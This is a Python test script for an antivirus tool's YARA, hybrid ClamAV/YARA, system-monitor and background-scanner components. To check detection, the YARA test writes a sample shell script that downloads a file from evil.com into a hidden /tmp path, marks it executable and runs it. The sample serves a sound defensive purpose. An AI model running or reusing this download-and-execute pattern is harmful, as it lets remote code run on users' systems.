#!/usr/bin/env python3
"""Tests for Phase 3 Real-Time Protection optimizations.

Tests YARA integration, hybrid scanning, and system load monitoring.
"""

import tempfile
from pathlib import Path

# Test YARA Scanner
print("=" * 70)
print("Testing YARA Scanner")
print("=" * 70)

from app.core.yara_scanner import YaraScanner, YARA_AVAILABLE

scanner = YaraScanner()
print(f"YARA Available: {YARA_AVAILABLE}")
print(f"Scanner Available: {scanner.available}")
print(f"Rules Loaded: {scanner.rules is not None}")

if scanner.available and scanner.rules:
    # Create test files
    with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as f:
        f.write("#!/bin/bash\n")
        f.write("wget http://evil.com/malware.sh -O /tmp/.hidden\n")
        f.write("chmod +x /tmp/.hidden\n")
        f.write("/tmp/.hidden &\n")
        test_file = f.name

    result = scanner.scan_file(test_file)
    print(f"\nTest file: {test_file}")
    print(f"  Matched: {result.matched}")
    print(f"  Rules: {result.rules_matched}")
    print(f"  Severity: {result.severity}")

    # Clean up
    Path(test_file).unlink()

    # Get statistics
    stats = scanner.get_statistics()
    print(f"\nYARA Scanner Statistics:")
    for key, value in stats.items():
        print(f"  {key}: {value}")
else:
    print("⚠️  YARA scanner not available - skipping YARA tests")
    if not YARA_AVAILABLE:
        print("   Install with: pip install yara-python")

# Test Hybrid Scanner
print("\n" + "=" * 70)
print("Testing Hybrid Scanner")
print("=" * 70)

try:
    from app.core.hybrid_scanner import HybridScanner

    hybrid = HybridScanner(enable_clamav=True, enable_yara=True)
    print(f"ClamAV Enabled: {hybrid.clamav_enabled}")
    print(f"YARA Enabled: {hybrid.yara_enabled}")

    # Test clean file
    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
        f.write("This is a clean text file.\n")
        test_file = f.name

    result = hybrid.scan_file(test_file)
    print(f"\nClean file test:")
    print(f"  File: {test_file}")
    print(f"  Infected: {result.infected}")
    print(f"  Engine: {result.scan_engine}")
    print(f"  Threat Level: {result.threat_level}")
    print(f"  Detection Layers: {result.detection_layers}")

    # Clean up
    Path(test_file).unlink()

    # Get statistics
    stats = hybrid.get_statistics()
    print(f"\nHybrid Scanner Statistics:")
    print(f"  Scans performed: {stats['scans_performed']}")
    print(f"  Engines enabled: {stats['engines_enabled']}")
    print(f"  Detections: {stats['detections']}")

    if "clamav" in stats:
        print(f"  ClamAV available: {stats['clamav'].get('available', False)}")
    if "yara" in stats:
        print(f"  YARA available: {stats['yara'].get('available', False)}")
        print(f"  YARA rules loaded: {stats['yara'].get('rules_loaded', False)}")

except Exception as e:
    print(f"⚠️  Hybrid scanner test failed: {e}")

# Test System Monitor
print("\n" + "=" * 70)
print("Testing System Monitor")
print("=" * 70)

from app.monitoring.system_monitor import SystemMonitor, PSUTIL_AVAILABLE

monitor = SystemMonitor(
    cpu_threshold_high=80.0,
    cpu_threshold_critical=90.0,
    memory_threshold_high=85.0,
)

print(f"psutil Available: {PSUTIL_AVAILABLE}")
print(f"Monitor Available: {monitor.available}")

if monitor.available:
    load = monitor.get_current_load()
    if load:
        print(f"\nCurrent System Load:")
        print(f"  CPU: {load.cpu_percent:.1f}%")
        print(f"  Memory: {load.memory_percent:.1f}%")
        print(f"  Load Level: {load.load_level}")
        print(f"  Should Throttle: {load.is_high_load}")
        print(f"  Should Pause: {load.is_critical_load}")

        print(f"\nAdaptive Recommendations:")
        print(f"  Should throttle: {monitor.should_throttle_scanning()}")
        print(f"  Should pause: {monitor.should_pause_scanning()}")
        print(
            f"  Recommended workers (max 4): {monitor.get_recommended_worker_count(4)}"
        )
        print(f"  Recommended delay: {monitor.get_recommended_delay()}s")

    stats = monitor.get_statistics()
    print(f"\nSystem Monitor Statistics:")
    for key, value in stats.items():
        if key != "current_load":
            print(f"  {key}: {value}")
else:
    print("⚠️  System monitor not available")
    if not PSUTIL_AVAILABLE:
        print("   Install with: pip install psutil")

# Test BackgroundScanner Integration
print("\n" + "=" * 70)
print("Testing BackgroundScanner Integration")
print("=" * 70)

from app.monitoring import BackgroundScanner

scanner = BackgroundScanner(
    enable_cache=True,
    enable_hybrid=True,
    enable_system_monitor=True,
)

print(f"Hybrid Mode: {scanner.hybrid_mode}")
print(f"Cache Enabled: {scanner.scan_cache is not None}")
print(f"System Monitor Enabled: {scanner.system_monitor is not None}")

stats = scanner.get_statistics()
print(f"\nBackgroundScanner Statistics:")
print(f"  Running: {stats['running']}")
print(f"  Hybrid mode: {stats['hybrid_mode']}")
print(f"  Cache enabled: {'cache' in stats}")
print(f"  System monitor enabled: {'system_monitor' in stats}")
print(f"  Hybrid scanner enabled: {'hybrid_scanner' in stats}")

if "hybrid_scanner" in stats:
    hs = stats["hybrid_scanner"]
    print(f"\n  Hybrid Scanner Details:")
    print(f"    ClamAV enabled: {hs['engines_enabled']['clamav']}")
    print(f"    YARA enabled: {hs['engines_enabled']['yara']}")

# Summary
print("\n" + "=" * 70)
print("Phase 3 Tests Summary")
print("=" * 70)

components = {
    "YARA Scanner": (
        scanner.available
        if "scanner" in dir() and hasattr(scanner, "available")
        else False
    ),
    "Hybrid Scanner": (
        hybrid.clamav_enabled or hybrid.yara_enabled if "hybrid" in dir() else False
    ),
    "System Monitor": monitor.available if monitor else False,
    "BackgroundScanner Integration": True,
}

all_passed = True
for component, status in components.items():
    status_str = "✅ AVAILABLE" if status else "⚠️  NOT AVAILABLE"
    print(f"  {component}: {status_str}")
    if component != "System Monitor" and not status:  # System monitor is optional
        all_passed = False

print("\n" + "=" * 70)
if all_passed:
    print("🎉 ALL CORE COMPONENTS AVAILABLE!")
    print("\nPhase 3 Features:")
    print("  ✅ YARA heuristic detection")
    print("  ✅ Multi-engine hybrid scanning")
    print("  ✅ System load awareness")
    print("  ✅ Adaptive scanning throttling")
    print("\n📈 Expected Performance Impact:")
    print("  - 15-25% better threat detection (YARA heuristics)")
    print("  - Multi-layered defense (ClamAV + YARA)")
    print("  - Adaptive resource usage (system load monitoring)")
else:
    print("⚠️  SOME COMPONENTS NOT AVAILABLE")
    print("\nMissing dependencies can be installed with:")
    if not YARA_AVAILABLE:
        print("  pip install yara-python")
    if not PSUTIL_AVAILABLE:
        print("  pip install psutil")

print("=" * 70)
